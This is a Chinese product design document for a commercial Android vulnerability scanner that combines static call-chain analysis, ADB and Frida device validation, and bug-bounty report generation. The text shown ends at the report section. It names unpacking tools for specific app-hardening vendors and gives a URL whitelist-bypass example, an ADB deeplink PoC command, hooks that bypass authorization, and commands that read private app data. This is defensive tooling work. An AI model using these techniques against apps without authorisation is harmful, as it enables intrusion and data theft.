# Android 通用漏洞扫描平台商业化方案 V2.0

---

## 目录

1. [背景与目标](#1-背景与目标)
2. [最终目标能力定义](#2-最终目标能力定义)
3. [差异化定位与商业模式](#3-差异化定位与商业模式)
4. [核心设计原则](#4-核心设计原则)
5. [平台总体架构](#5-平台总体架构)
6. [输入与环境模块](#6-输入与环境模块)
7. [反编译与预处理模块](#7-反编译与预处理模块)
8. [加固与混淆对抗](#8-加固与混淆对抗)
9. [静态分析引擎](#9-静态分析引擎)
10. [调用链与证据图引擎](#10-调用链与证据图引擎)
11. [动态验证引擎](#11-动态验证引擎)
12. [Root 与非 Root 漏洞处理策略](#12-root-与非-root-漏洞处理策略)
13. [漏洞评级与误报控制](#13-漏洞评级与误报控制)
14. [报告生成规范](#14-报告生成规范)
15. [Web 界面设计要求](#15-web-界面设计要求)
16. [数据模型设计](#16-数据模型设计)
17. [通用规则体系设计](#17-通用规则体系设计)
18. [自动验证模板库](#18-自动验证模板库)
19. [证据留存与可审计性](#19-证据留存与可审计性)
20. [性能与扩展性](#20-性能与扩展性)
21. [开发实施路线](#21-开发实施路线)
22. [验收标准](#22-验收标准)
23. [现实可达成的效果预估](#23-现实可达成的效果预估)
24. [风险与限制](#24-风险与限制)
25. [法律与合规边界](#25-法律与合规边界)
26. [对现有项目的具体改造建议](#26-对现有项目的具体改造建议)
27. [结论](#27-结论)
28. [附录A：标准漏洞报告样例](#附录a标准漏洞报告样例)
29. [附录B：术语对照表](#附录b术语对照表)

---

## 1. 背景与目标

当前项目的核心问题，不是"能不能扫出一些问题"，而是"扫出来的问题能不能直接拿去核实、复现、提交、交付"。

真正的商业级移动安全扫描平台，必须解决以下痛点：

- 不能只给命中点，必须给完整上下文与调用链证明。
- 不能只给静态猜测，必须尽可能在本地真机上自动验证。
- 不能把"攻击面""疑似风险""真实漏洞"混在一起报告。
- 不能只适配某一个 App，必须针对任意 Android App 具备较强通用性。
- 对于非 Root 和 Root 两种手机环境，必须有不同的验证与报告策略。
- 对于无法自动验证但代码上已能确定成立的问题，必须给出明确的代码证明和可执行复现步骤。

**本方案的目标**：将现有项目升级为一套面向多 App、强调高准确率、高证据密度、可本机验证、可生成小白可复现报告的 Android 安全扫描平台。

**一句话定位**：

> 业内首个将静态调用链证明 + 真机自动复现 + 标准化 SRC 报告打通的 Android 安全扫描平台。

---

## 2. 最终目标能力定义

平台最终应具备以下能力：

1. 输入任意 Android APK 或已安装包名，自动完成静态审计。
2. 自动识别导出组件、Deeplink、WebView、JSBridge、Provider、安装下载链、鉴权类逻辑、隐私读取链等核心攻击面。
3. 对每个问题输出"入口 → 参数 → 处理逻辑 → 危险动作"的完整调用链。
4. 自动区分：
   - 已动态验证的真实漏洞
   - 代码链闭环可确认的问题
   - 需要 Root 才能验证的问题
   - 仅攻击面，不应作为正式漏洞提交的问题
5. 在手机连接情况下，自动完成：
   - ADB 非 Root 验证
   - Root 环境 Frida/Hook 验证
   - WebView/JSBridge PoC 注入验证
   - Provider 数据返回验证
   - 导出组件启动与副作用验证
6. 自动生成适合不同场景的标准化漏洞报告：
   - 内部审计报告
   - SRC/HackerOne 风格提交报告
   - 小白复现报告

---


## 3. 差异化定位与商业模式

### 3.1 市场现有方案短板分析

| 工具 | 类型 | 核心短板 | 本平台改进点 |
|------|------|---------|------------|
| MobSF | 开源/静态为主 | 只有命中点无调用链，无真机动态验证，无 Root/非 Root 区分 | 完整调用链 + 双模自动验证 |
| AppShark (字节) | 开源/污点分析 | 规则强但无动态联动，无报告标准化，无设备联动 | 静态 + 动态一体化闭环 |
| Drozer | 开源/纯动态 | 无静态代码分析，无调用链回溯，无自动 PoC 生成 | 静态发现 + 动态验证完整链路 |
| QARK/AndroBugs | 开源/规则扫描 | 规则过时，误报率高，无证据分级 | 证据驱动，分桶输出 |
| Ostorlab | 商业/SaaS | 云端扫描无法本地验证，无 Root 环境集成 | 本地设备联动，Root/非 Root 双模 |
| 人工审计 | 服务 | 慢（3-7天/App）、贵（$5000+/次） | 自动化 70% 流程，人工只做最后判定 |

### 3.2 核心差异化能力

1. **调用链证明**：不是"扫到什么"，而是"从哪里进入、参数怎么流、最终触发什么"的完整链条。
2. **真机自动复现**：内置 ADB + Frida + PoC Server，静态发现后自动在连接设备上执行验证。
3. **证据分级制度**：VERIFIED_REAL / CODE_PROVEN / ROOT_VERIFIED / ATTACK_SURFACE_ONLY，严禁混报。
4. **标准化可交付报告**：一键生成 SRC 提交格式、客户审计格式、小白复现格式。
5. **Root/非 Root 双模**：同一漏洞自动判断当前设备能力，选择最优验证路径。

### 3.3 目标客户与定价模型

#### 客户分层

| 客户类型 | 核心需求 | 平台价值 |
|---------|---------|---------|
| 独立白帽/安全研究员 | 快速出高质量 SRC 报告拿赏金 | 自动化 70% 分析 + 一键报告 |
| 甲方移动安全团队 | 上线前审计、合规检查 | 批量扫描 + 统一风险视图 + 证据归档 |
| 安全外包/测试公司 | 提高产出效率，降低人力成本 | 批量任务 + 标准化交付物 |
| 应用市场/审核机构 | 上架前安全审核 | API 集成 + 自动通过/拒绝建议 |

#### 定价模型建议

| 版本 | 定价 | 核心能力 |
|------|------|---------|
| 社区版（免费） | $0 | 基础静态扫描 + 攻击面列表（无调用链、无动态验证） |
| 专业版（个人） | $49/月 或 $399/年 | 完整静态 + 调用链 + 非 Root 动态验证 + SRC 报告生成 |
| 企业版 | $299/月起 或按年私有化 | 全部功能 + Root 验证 + 批量扫描 + API + 设备池管理 |
| 定制部署 | 按需报价 | 私有化 + 定制规则 + 专属支持 |

#### 北极星指标

> **报告可直接提交 SRC 且通过审核的比例 ≥ 70%**

---

## 4. 核心设计原则

### 4.1 证据优先，而不是命中优先

任何漏洞结论都必须有足够证据支撑。

- "扫到敏感方法" ≠ 漏洞
- "组件导出" ≠ 漏洞
- "有 JSBridge" ≠ 漏洞

平台必须按以下判断顺序逐步升级漏洞等级：

| 条件 | 满足后的最高等级 |
|------|---------------|
| 1. 存在外部可达入口 | ATTACK_SURFACE_ONLY |
| 2. + 可控关键参数 | ATTACK_SURFACE_ONLY（升级候选） |
| 3. + 进入敏感逻辑 | CODE_PROVEN 候选 |
| 4. + 触发真实危险动作（代码链闭环） | CODE_PROVEN |
| 5. + 真机环境验证成功 | VERIFIED_REAL / ROOT_VERIFIED |

### 4.2 分级输出，严禁混报

平台强制将问题划分为不同证据等级：

| 等级 | 含义 | 是否进入正式报告 |
|------|------|---------------|
| VERIFIED_REAL | 非 Root 设备验证成功，具备可重复证据 | ✅ |
| CODE_PROVEN | 未动态复现，但代码链完整证明漏洞成立 | ✅ |
| ROOT_VERIFIED | Root 设备验证成功 | ✅ |
| ROOT_REQUIRED | 需 Root 验证，当前仅有代码证明 + 可执行脚本 | ✅（标注条件） |
| ATTACK_SURFACE_ONLY | 仅攻击面，不足以单独作为正式漏洞 | ❌ 进入候选区 |

### 4.3 静态分析与动态验证必须联动

- 静态分析负责"发现路径"
- 动态验证负责"确认结果"
- 两者必须数据互通，形成闭环

### 4.4 必须支持 Root 与非 Root 双模

| 模式 | 可用能力 |
|------|---------|
| 非 Root | ADB am start/broadcast/content、Deeplink 触发、PoC 页面、logcat、界面观察 |
| Root | 以上全部 + Frida Hook、进程内方法观察、参数拦截、返回值抓取、私有数据访问验证、鉴权绕过验证 |

---

## 5. 平台总体架构

```
┌─────────────────────────────────────────────────────────────────┐
│                        Web 工作台 & API                          │
├─────────────────────────────────────────────────────────────────┤
│                      报告生成引擎                                 │
├──────────────┬──────────────┬───────────────┬───────────────────┤
│  证据存储    │  任务编排     │   设备池管理   │   用户管理        │
├──────────────┴──────────────┴───────────────┴───────────────────┤
│                    动态验证引擎                                   │
│         ┌─────────────┬─────────────────┐                       │
│         │ 非 Root 验证 │   Root 验证      │                       │
│         │ (ADB/PoC)   │  (Frida/Hook)   │                       │
│         └─────────────┴─────────────────┘                       │
├─────────────────────────────────────────────────────────────────┤
│                 调用链与证据图引擎                                 │
│         (SOURCE → TAINT → GUARD → SINK → EVIDENCE)              │
├─────────────────────────────────────────────────────────────────┤
│                    静态分析引擎                                   │
│  ┌────────┬────────┬────────┬────────┬────────┬────────┐       │
│  │Manifest│Deeplink│WebView │JSBridge│Provider│鉴权分析│       │
│  └────────┴────────┴────────┴────────┴────────┴────────┘       │
├─────────────────────────────────────────────────────────────────┤
│              反编译与预处理 + 加固对抗                             │
│         (jadx + apktool + aapt + 脱壳引擎)                      │
├─────────────────────────────────────────────────────────────────┤
│                   输入与环境模块                                  │
│         (APK/包名/批量 + 设备探测 + 能力判定)                    │
└─────────────────────────────────────────────────────────────────┘
```

八大核心模块：
1. 输入与环境模块
2. 反编译与预处理模块
3. 加固与混淆对抗模块
4. 静态分析引擎
5. 调用链与证据图引擎
6. 动态验证引擎（含 Root/非 Root）
7. 证据存储与任务编排模块
8. 报告生成与 Web 展示模块

---


## 6. 输入与环境模块

### 6.1 输入类型

| 输入方式 | 说明 |
|---------|------|
| APK 文件路径 | 本地或远程 APK 文件 |
| 已安装包名 | 从连接设备提取 APK 后分析 |
| ADB 设备包名 | 自动 `adb pull` 获取 |
| 批量 APK 目录 | 扫描指定目录下所有 APK |
| 批量包名列表 | 文本文件列出多个包名 |

### 6.2 环境探测

扫描开始前，自动探测并记录：

```json
{
  "adb_available": true,
  "device_connected": true,
  "device_serial": "XXXXXXXX",
  "android_version": "13",
  "target_installed": true,
  "root_available": true,
  "su_binary": "/system/bin/su",
  "frida_server": true,
  "frida_version": "16.1.4",
  "adb_reverse_support": true,
  "poc_writable_dir": "/data/local/tmp/poc/",
  "timestamp": "2025-01-15T10:30:00Z"
}
```

环境探测结果**必须进入报告头部**，作为所有验证结论的前置上下文。

---

## 7. 反编译与预处理模块

### 7.1 标准化反编译链

不能依赖单一反编译器，必须并行使用：

| 工具 | 用途 | 产出 |
|------|------|------|
| jadx | Java 语义视图，便于规则与上下文阅读 | `jadx_sources/` |
| apktool | Manifest、资源、smali，确认编译器丢失的逻辑 | `smali/` `resources/` |
| aapt/aapt2 | 包信息、组件信息、权限列表 | `metadata/` |

### 7.2 预处理产物目录结构

```
output/{package_name}_{sha256}/
├── manifest/
│   └── AndroidManifest.xml
├── jadx_sources/
│   └── com/example/...
├── smali/
│   └── com/example/...
├── resources/
│   ├── res/
│   └── assets/
├── signatures/
│   └── cert_info.json
├── metadata/
│   ├── package_info.json
│   ├── permissions.json
│   └── components.json
└── ir/
    ├── call_graph.json
    ├── component_map.json
    └── taint_sources.json
```

### 7.3 中间表示 IR

必须构建统一 IR，不能让规则直接扫文本。IR 至少抽象出：

| IR 元素 | 说明 |
|---------|------|
| Component | Activity/Service/Receiver/Provider 及其属性 |
| IntentFilter | action/category/data scheme 等 |
| UriStructure | scheme://host/path 结构化表示 |
| MethodDef | 方法签名、所属类、访问修饰 |
| CallRelation | 调用者 → 被调用者 |
| ParamSource | 参数来源（Intent/Uri/SharedPref/DB/Network） |
| ParamPropagation | 参数在方法间的传播路径 |
| SensitiveSink | 危险 API 调用点 |
| PermissionCheck | 权限校验点 |
| WebViewRegistration | WebView 创建及 JSBridge 注册 |

这是从"脚本工具"走向"平台"的关键一步。

---

## 8. 加固与混淆对抗

> **这是商业化落地的核心瓶颈之一。** 大厂 App 几乎 100% 使用加固 + 混淆，不解决这一层，静态分析等于废纸。

### 8.1 加壳识别与脱壳

| 加固厂商 | 识别特征 | 脱壳方案 |
|---------|---------|---------|
| 腾讯乐固 | libshella.so、assets/0OO00l111l1l | frida-dexdump / FART |
| 360加固 | libjiagu.so、assets/classes*.dex | BlackDex / frida-dexdump |
| 梆梆 | libDexHelper.so、libSecShell.so | FART / dump-dex |
| 爱加密 | libexec.so、libexecmain.so | frida-dexdump |
| 未知壳 | DEX magic 异常、ClassLoader 重定向 | 通用 Hook DexClassLoader |

**脱壳流程**：
1. 识别壳类型（特征文件/SO 名匹配）
2. 如有 Root 设备：自动启动目标 App + frida-dexdump 抓取内存 DEX
3. 无 Root 设备：尝试 BlackDex（Android 10+免 Root 脱壳）
4. 脱出 DEX 后重新走 jadx 反编译链
5. 标记"脱壳产物"，与原始产物区分

### 8.2 混淆应对策略

| 混淆类型 | 应对方法 |
|---------|---------|
| 类名/方法名混淆 (ProGuard/R8) | 通过字符串常量反定位（如 `"javascript:"`、`"file:///"`）；通过特征 API 调用模式识别 |
| 字符串加密 | Hook String 解密方法，运行时 dump；静态识别解密函数模式 |
| 控制流平坦化 | 针对 switch-case 分发器做模式还原；回退到 smali 级分析 |
| 反射调用 | 匹配 `Class.forName` / `getMethod` / `invoke` 模式，尝试静态解析常量参数 |
| 动态加载 (DexClassLoader) | Hook 加载点，dump 二级 DEX |
| Native 层逻辑 (JNI) | 识别 native 方法声明，标记为"需人工审计"；Hook JNI 调用桥获取参数（P2 功能） |

### 8.3 混淆环境下的规则适配

- 规则不能硬编码类名，必须基于**行为模式**匹配：
  - "调用了 `addJavascriptInterface` 的类" → 标记为 JSBridge 宿主
  - "实现了 `query()` 且在 Manifest 中 exported=true" → 标记为 Provider 攻击面
  - "接收 Intent 后调用了 `loadUrl`" → 标记为 Deeplink→WebView 链路
- 混淆后无法解析的关键路径，必须标记 `OBFUSCATION_BLOCKED`，不做误报猜测

### 8.4 脱壳成功率预估

| 场景 | 预估成功率 |
|------|-----------|
| 有 Root + Frida | 85% - 95% |
| 无 Root + BlackDex (Android 10+) | 60% - 75% |
| VMP/深度保护 | 30% - 50%（需人工辅助） |
| 无任何设备（纯静态） | 仅分析未加固部分 |

---

## 9. 静态分析引擎

静态分析引擎负责构造攻击面和漏洞候选，**不直接下最终结论**。

### 9.1 Manifest 与导出面分析

必须识别：

- Exported Activity / Service / Receiver / Provider
- 自定义权限保护（android:permission / android:protectionLevel）
- intent-filter（action / category / data）
- scheme / host / path / pathPattern
- grantUriPermissions
- readPermission / writePermission
- allowBackup / debuggable / usesCleartextTraffic

形成统一攻击面数据结构：

```json
{
  "component": "com.example.DeeplinkActivity",
  "type": "activity",
  "exported": true,
  "permission_required": null,
  "intent_filters": [
    {
      "action": "android.intent.action.VIEW",
      "schemes": ["myapp", "https"],
      "hosts": ["open.example.com"],
      "paths": ["/web", "/redirect"]
    }
  ],
  "externally_reachable": true,
  "param_source_type": "intent_data_uri"
}
```

### 9.2 Deeplink / AppLink 分析

核心目标：

1. 识别自定义 Scheme 路由入口
2. 追踪入口参数（url / target / class / pkg / redirect）
3. 分析白名单校验逻辑
4. 识别重定向与二次跳转风险
5. 追踪是否进入 WebView/XWebView

**必须完整追踪的链路**：

```
getIntent().getData()
  → getQueryParameter("url")
  → isWhitelisted(url) / checkDomain(url)    // GUARD 节点
  → new Intent(WebViewActivity)
  → putExtra("load_url", url)
  → WebViewActivity.loadUrl(url)             // SINK 节点
```

不能只记录某一行 `getQueryParameter`，必须追踪到最终 sink。

### 9.3 WebView / XWebView 分析

需要识别的关键配置：

| 配置 | 风险说明 |
|------|---------|
| `setJavaScriptEnabled(true)` | JS 执行能力开启 |
| `loadUrl(externalUrl)` | 外部可控 URL 加载 |
| `shouldOverrideUrlLoading()` | URL 拦截逻辑 |
| `setAllowFileAccess(true)` | 本地文件访问 |
| `setAllowUniversalAccessFromFileURLs(true)` | 跨域文件访问（高危） |
| `addJavascriptInterface(obj, name)` | JSBridge 暴露 |
| URL 白名单校验 | 绕过可能性 |

**分析重点不是"WebView 存在"，而是**：

- 外部是否可控加载 URL
- 是否能进入受 JSBridge 保护的 Web 页面
- 是否能借助白名单缺陷或跳转页面绕过限制

### 9.4 JSBridge 分析

对每个 `@JavascriptInterface` 方法，自动归类危险能力：

| 能力类别 | 示例方法 | 风险等级 |
|---------|---------|---------|
| 设备信息读取 | getDeviceId(), getIMEI() | 中 |
| 应用列表读取 | getInstalledApps() | 中 |
| 启动任意组件 | startActivity(intent) | 高 |
| 打开浏览器 | openBrowser(url) | 中 |
| 发起下载 | downloadFile(url) | 高 |
| 发起安装 | installApk(path) | 严重 |
| 读写账户数据 | getToken(), getUserInfo() | 高 |
| 查询积分/钱包/订单 | getBalance(), getOrders() | 高 |
| 执行命令 | exec(cmd) | 严重 |
| 文件读写 | readFile(path), writeFile() | 严重 |

同时自动输出：

- 注册对象名（如 `android`、`jsbridge`）
- 注册类全名
- 所属 WebView 类
- 加载页面来源（静态 URL / 动态参数）
- 调用前提条件
- 可利用影响

### 9.5 Provider 分析

不能只看 exported，还要看具体操作：

| 方法 | 风险 |
|------|------|
| query() | 数据泄露 |
| insert() | 数据篡改 |
| update() | 数据篡改 |
| delete() | 数据破坏 |
| call() | 任意方法调用 |
| openFile() | 文件读取/路径穿越 |

必须分析：

- UriMatcher 路由表
- 是否校验 callingPackage
- 是否校验签名
- 是否依赖固定字段生成签名（可伪造）
- 返回数据是否包含敏感内容
- 是否支持 `content://` 直接查询

Provider 结论必须单独区分：

| 结论 | 含义 |
|------|------|
| 仅入口存在 | exported=true 但操作受限 |
| 可读数据 | query 返回敏感信息 |
| 可写数据 | insert/update 可篡改内容 |
| 可触发副作用 | call/openFile 导致文件操作或逻辑触发 |

### 9.6 导出组件危险动作分析

对导出组件要**继续追踪后续行为**：

- 启动后是否读取外部参数
- 是否进入下载/安装流程
- 是否进入付款/转账/删除/发消息/拨号等危险动作
- 是否只打开无意义界面

**判定准则**：如果只是打开一个正常首页或设置页，**不能报漏洞**。

### 9.7 安装/下载链分析

针对应用商店类 App 的重点分析：

- APK URL 来源（是否外部可控）
- 下载文件路径（是否可覆盖）
- PackageInstaller 交互方式
- Session 安装流程
- Silent install 前提条件
- 安装确认页面拦截逻辑
- 来源校验逻辑
- Referrer / callingPackage 校验

### 9.8 鉴权与逻辑越权分析

**不是简单字符串规则**，必须做"同类方法对比"：

1. 识别同类敏感方法集合（如所有修改用户数据的方法）
2. 统计其中哪些方法存在校验：`isOwner` / `isAdmin` / `checkPermission` / `loginCheck` / `roleCheck`
3. 找出**未做校验但执行同类危险动作**的方法
4. 再追踪该方法是否可被外部触达或业务可达

若无业务可达入口，仅作为研究项，**不进正式漏洞**。

### 9.9 其他规则覆盖

| 规则类别 | 检测目标 |
|---------|---------|
| INTENT_REDIRECTION | Intent 重放/重定向攻击 |
| PENDING_INTENT_MUTABLE | Android 12+ PendingIntent 可变标志 |
| BROADCAST_SENSITIVE_LEAK | 敏感广播泄露 |
| CRYPTO_MISUSE | 硬编码密钥/弱算法/ECB 模式 |
| NETWORK_CLEARTEXT | 明文 HTTP 传输敏感数据 |
| BACKUP_ALLOWED | allowBackup=true 导致数据泄露 |
| TASK_HIJACKING | taskAffinity 劫持 |
| STRANDHOGG | 任务栈劫持（StrandHogg 1.0/2.0） |
| ZIP_PATH_TRAVERSAL | ZipSlip 路径穿越 |
| FILE_PROVIDER_MISCONFIG | FileProvider root-path 过宽 |
| WEBVIEW_DEBUG_ENABLED | WebView 远程调试未关闭 |
| LOG_SENSITIVE_DATA | 日志输出敏感信息 |

---


## 10. 调用链与证据图引擎

> 这是当前项目**最缺且最关键**的一层。

### 10.1 为什么必须有调用链

用户真正需要的不是"命中了哪一行"，而是：

- **谁**可以调用（入口）
- **参数**从哪里来（来源）
- 中间经过**哪些处理**（转换/校验）
- 最后触发了**什么危险动作**（汇点）

### 10.2 证据图模型

采用工程化的图模型，便于可视化、查询和去重：

**节点类型**：

| 类型 | 说明 | 示例 |
|------|------|------|
| SOURCE | 外部输入入口 | Intent.getData()、Provider 调用、JSBridge 参数 |
| TAINT | 污点变量传播 | getQueryParameter("url") 赋值给 targetUrl |
| GUARD | 校验/鉴权点 | isWhitelisted(url)、checkPermission() |
| TRANSFORM | 中间数据转换 | Uri.parse()、Base64.decode() |
| SINK | 危险 API 调用 | loadUrl()、startActivity()、installApk() |
| EVIDENCE | 验证产出物 | logcat 输出、Hook 返回、截图 |

**边类型**：

| 类型 | 说明 |
|------|------|
| DATA_FLOW | 数据流传播 |
| CONTROL_FLOW | 控制流依赖 |
| CALL | 方法调用关系 |
| GUARD_PASS | 校验通过 |
| GUARD_BYPASS | 校验绕过 |

**GUARD 节点特殊标注**：

- `GUARD_STATUS: PASSED` — 条件可绕过或无实际限制
- `GUARD_STATUS: BLOCKED` — 条件严格，暂无绕过
- `GUARD_STATUS: PARTIAL` — 部分场景可绕过

### 10.3 最小证据链要求

每个漏洞至少生成以下节点序列：

```
[SOURCE] → [TAINT] → [GUARD(可选)] → [TRANSFORM(可选)] → [SINK]
```

完整示例：

```
[SOURCE] Exported Activity: com.example.DeeplinkRouter
    ↓ getData()
[TAINT] uri = getIntent().getData()
    ↓ getQueryParameter("url")
[TAINT] targetUrl = uri.getQueryParameter("url")  // 外部可控
    ↓ 
[GUARD] SafeUrlChecker.isWhitelisted(targetUrl)
    ↓ GUARD_BYPASS: 前缀匹配 "https://trust.com" 可绕过为 "https://trust.com.evil.com"
[TRANSFORM] intent.putExtra("load_url", targetUrl)
    ↓ startActivity(WebViewActivity)
[SINK] WebViewActivity.webView.loadUrl(targetUrl)
    ↓
[SINK] webView.addJavascriptInterface(new JSBridge(), "android")
    ↓
[EVIDENCE] JSBridge.installApk(url) 可从注入页面调用
```

### 10.4 调用链输出格式

报告中每条漏洞必须自动写出：

```
调用链：
  1. [入口] com.example.DeeplinkRouter.onCreate() (exported=true)
  2. [参数获取] uri.getQueryParameter("url") → targetUrl (外部可控)
  3. [校验] SafeUrlChecker.isWhitelisted(targetUrl) → 前缀匹配可绕过
  4. [传递] intent.putExtra("load_url", targetUrl)
  5. [跳转] startActivity(WebViewActivity.class)
  6. [加载] webView.loadUrl(intent.getStringExtra("load_url"))
  7. [暴露] addJavascriptInterface(JSBridge, "android")
  8. [危险动作] JSBridge.installApk(url) — 任意 APK 安装

关键代码片段：
  // DeeplinkRouter.java:45
  String targetUrl = getIntent().getData().getQueryParameter("url");
  
  // SafeUrlChecker.java:23
  return url.startsWith("https://trust.com");  // 前缀匹配，可绕过
  
  // WebViewActivity.java:67
  webView.loadUrl(getIntent().getStringExtra("load_url"));
  webView.addJavascriptInterface(new JSBridge(), "android");
```

**不能只贴 3 行孤立代码。**

---

## 11. 动态验证引擎

> 动态验证是商业化平台的分水岭。

### 11.1 非 Root 验证能力

| 能力 | ADB 命令 / 方式 | 用途 |
|------|----------------|------|
| 启动 Activity | `adb shell am start -n/-a/-d` | 验证导出组件 |
| 发送 Broadcast | `adb shell am broadcast` | 验证导出 Receiver |
| 启动 Service | `adb shell am startservice` | 验证导出 Service |
| Provider 查询 | `adb shell content query --uri` | 验证 Provider 数据泄露 |
| Provider 写入 | `adb shell content insert/update/delete` | 验证 Provider 数据篡改 |
| Deeplink 触发 | `adb shell am start -d "scheme://..."` | 验证 Deeplink 路由 |
| 端口映射 | `adb reverse tcp:8080 tcp:8080` | 本地 PoC 服务器 |
| PoC 页面服务 | 启动本地 HTTP Server | 注入测试 HTML |
| Logcat 监听 | `adb logcat -s TAG` | 抓取运行日志 |
| Activity 检测 | `adb shell dumpsys activity top` | 确认界面启动 |
| 截图 | `adb shell screencap` | 证据留存 |

### 11.2 Root 验证能力

Root 下在非 Root 基础上增加：

| 能力 | 工具/方式 | 用途 |
|------|----------|------|
| 命令执行 | `su -c` | 访问受保护路径 |
| Frida 注入 | `frida -U -f pkg -l script.js` | 动态 Hook |
| Hook 方法入参 | Frida Interceptor | 确认参数实际值 |
| Hook 返回值 | Frida Interceptor | 确认校验结果 |
| Hook 鉴权分支 | 修改返回值绕过 | 验证越权 |
| Hook WebView | 拦截 loadUrl | 确认实际加载 URL |
| Hook JSBridge | 拦截接口调用 | 确认可触发 |
| Hook Provider | 拦截 query/call 返回 | 确认数据内容 |
| 私有数据访问 | `su -c cat /data/data/pkg/...` | 验证敏感文件 |
| 数据库读取 | `su -c sqlite3` | 验证本地数据库内容 |
| Hook 安装流程 | 拦截 PackageInstaller | 验证静默安装 |

### 11.3 验证脚本自动生成

平台**不能只告诉用户"需要验证"**，必须自动生成：

| 产出 | 格式 |
|------|------|
| ADB 命令 | 可直接复制执行的 shell 命令 |
| Frida 脚本 | 完整 .js 文件，含目标类/方法/参数处理 |
| PoC HTML | 本地测试页面，含 JSBridge 调用代码 |
| HTTP 服务启动 | Python/Node 一行启动命令 |
| Root 命令序列 | su -c 完整命令链 |
| 数据抓取脚本 | 自动提取并格式化输出 |

### 11.4 验证结果记录

每次动态验证必须产出证据文件：

```json
{
  "validation_id": "val_20250115_001",
  "finding_id": "find_deeplink_webview_001",
  "method": "adb_am_start",
  "device": "Pixel_6a_SERIAL",
  "root_status": false,
  "timestamp": "2025-01-15T10:35:22Z",
  "duration_ms": 3200,
  "command": "adb shell am start -a android.intent.action.VIEW -d \"myapp://web?url=http://10.0.0.1:8080/poc.html\"",
  "success": true,
  "return_code": 0,
  "logcat_snippet": "D/WebViewActivity: loading url: http://10.0.0.1:8080/poc.html",
  "hook_output": null,
  "screenshot": "evidence/val_001/screenshot.png",
  "poc_response": "JSBridge.getDeviceId() returned: 861234567890123"
}
```

证据与漏洞 ID 绑定，报告直接引用。

---

## 12. Root 与非 Root 漏洞处理策略

### 12.1 非 Root 可直接验证的问题

| 漏洞类型 | 验证方式 |
|---------|---------|
| 导出 Activity/Service/Receiver | am start/broadcast/startservice |
| Provider 数据泄露/篡改 | content query/insert/update/delete |
| Deeplink → WebView | am start -d "scheme://..." |
| 白名单绕过 | 构造绕过 URL + PoC 页面 |
| JSBridge 调用 | PoC HTML + adb reverse |
| 外部控制安装下载链 | 构造恶意 URL 触发下载 |

**原则**：能非 Root 验证的，优先非 Root，降低使用门槛。

### 12.2 需 Root 才能验证的问题

| 漏洞类型 | 为什么需要 Root |
|---------|---------------|
| 私有目录数据泄露 | /data/data/pkg/ 需 Root 访问 |
| 本地数据库敏感信息 | sqlite3 读取需 Root |
| Hook 确认返回值 | Frida 注入需 Root |
| 鉴权逻辑绕过验证 | 修改返回值需 Hook |
| 系统权限路径验证 | 系统级操作需 Root |

**处理策略**：

- 明确标记 `ROOT_REQUIRED` 或 `ROOT_VERIFIED`
- 给出完整 Frida 脚本
- 给出预期返回结果
- 说明为什么 Root 是必要条件
- 如有 Root 设备则自动执行并标记为 `ROOT_VERIFIED`

### 12.3 无 Root 但代码可确定的问题

允许进入 `CODE_PROVEN`，前提是**全部满足**：

- [x] 入口可达（exported/Deeplink/公开接口）
- [x] 参数可控（外部输入直接影响）
- [x] 条件可满足（无不可绕过的 GUARD）
- [x] 危险动作明确（SINK 有真实危害）
- [x] 不依赖纯猜测（有代码证据）

并且**必须给出**：
- 完整代码调用链
- 手工复现步骤
- 可执行脚本（即使无法自动运行）

---

## 13. 漏洞评级与误报控制

### 13.1 为什么误报控制是核心竞争力

误报 = 失去客户信任。

当前工具的典型误报场景：
- 导出组件就报漏洞（实际只是设置页面）
- 有 JSBridge 就报高危（实际外部无法进入该 WebView）
- 没证据就写高危（只是"看起来危险"）

**本平台的核心承诺：正式报告里的每一条都有证据链支撑。**

### 13.2 漏洞判定五要素

每个问题必须回答：

| 要素 | 问题 | 不满足则 |
|------|------|---------|
| 可达性 | 外部是否可达该入口？ | 降为 ATTACK_SURFACE |
| 可控性 | 关键参数是否外部可控？ | 降为 ATTACK_SURFACE |
| 危险性 | 最终动作是否有真实危害？ | 不报 |
| 影响性 | 影响是否真实可量化？ | 降级 |
| 已验证 | 是否有动态/代码证据？ | 降为 ROOT_REQUIRED 或 ATTACK_SURFACE |

### 13.3 严重度与真实性双维矩阵

```
               ATTACK_SURFACE   CODE_PROVEN   ROOT_VERIFIED   VERIFIED_REAL
CRITICAL       候选研究区        正式报告       正式报告         正式报告(最高优先)
HIGH           候选研究区        正式报告       正式报告         正式报告
MEDIUM         不报             正式报告       正式报告         正式报告
LOW            不报             候选区         正式报告         正式报告
INFO           不报             不报           候选区           候选区
```

### 13.4 不应进入正式漏洞的场景

| 场景 | 原因 |
|------|------|
| 单纯导出 Activity 打开首页 | 无危险动作 |
| JSBridge 存在但外部无法进入 WebView | 入口不可达 |
| 发现敏感方法但无可达路径 | 可达性不满足 |
| 存在白名单但未发现绕过 | GUARD 未突破 |
| WebView 开启 JS 但只加载固定内部 URL | 参数不可控 |
| allowBackup=true 但无敏感数据 | 影响不真实 |

---


## 14. 报告生成规范

### 14.1 报告结构

每份正式报告固定结构：

```
1. 扫描概况
   - 目标 App 信息（包名/版本/签名）
   - 扫描时间
   - 使用工具版本
   
2. 设备与环境
   - 设备型号/Android 版本
   - Root 状态
   - Frida 版本
   - 网络环境

3. 发现漏洞汇总
   - 按严重度统计
   - 按真实性等级统计
   - 关键风险概览

4. 已验证漏洞详情 (VERIFIED_REAL)
5. 代码证实漏洞详情 (CODE_PROVEN)
6. Root 专项漏洞详情 (ROOT_VERIFIED / ROOT_REQUIRED)
7. 候选问题与攻击面 (ATTACK_SURFACE_ONLY)
8. 证据附件索引
```

### 14.2 漏洞详情模板

每条漏洞固定包含以下字段：

| 字段 | 说明 |
|------|------|
| 标题 | 一句话描述漏洞（SRC 提交风格） |
| 严重度 | Critical / High / Medium / Low |
| 类型 | Deeplink 劫持 / JSBridge 暴露 / Provider 泄露 / ... |
| 真实性等级 | VERIFIED_REAL / CODE_PROVEN / ROOT_VERIFIED / ROOT_REQUIRED |
| 是否需 Root | 是 / 否 |
| 触发方式 | ADB / Deeplink / 网页 / 应用内 |
| 影响条件 | 需要什么前提（无 / 登录态 / 特定版本） |
| 入口点 | 具体组件/方法 |
| 调用链 | 完整 SOURCE → SINK 链路 |
| 关键代码证明 | 带行号的代码片段 |
| 动态验证证据 | 命令 + 输出 + 截图 |
| 小白复现步骤 | 分步骤、可直接执行 |
| 命令/脚本 | ADB/Frida/PoC 完整内容 |
| 预期结果 | 每步执行后应看到什么 |
| 风险说明 | 对用户/业务的实际影响 |
| 修复建议 | 具体代码级修复方案 |
